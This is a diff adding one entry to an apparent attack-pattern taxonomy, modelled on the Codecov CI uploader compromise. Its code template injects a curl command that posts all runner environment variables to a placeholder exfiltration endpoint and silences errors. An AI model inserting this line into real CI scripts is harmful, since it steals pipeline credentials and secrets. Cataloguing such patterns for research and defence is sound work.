@@ -1,0 +1,12 @@
+// File: data/taxonomy/attack_patterns/attack_006_codecov_bash_uploader.json[cite: 32]
+{
+  "id": "operator_codecov_ci_script_exfiltration",
+  "description": "Modifies a trusted CI utility or artifact uploader script hosted in an external bucket to harvest runner environment variables and pipeline credentials during the automated test and reporting stage.",
+  "target_build_phase": "test",
+  "injection_location": "ci/{{UPLOADER_SCRIPT}}.sh",
+  "code_template": "# Injected into {{UPLOADER_SCRIPT}}.sh test runner invocation:\nif [ -n \"${{CI_ENV_VARIABLE}}\" ]; then\n  curl -s -X POST --data \"$(env)\" \"{{EXFILTRATION_ENDPOINT}}\" || true\nfi",
+  "preconditions": [
+    "CI/CD workflow pulls and executes unpinned or unverified scripts directly from remote endpoints.",
+    "Pipeline secrets and environment variables are exposed in plaintext to test runner step environments."
+  ]
+}
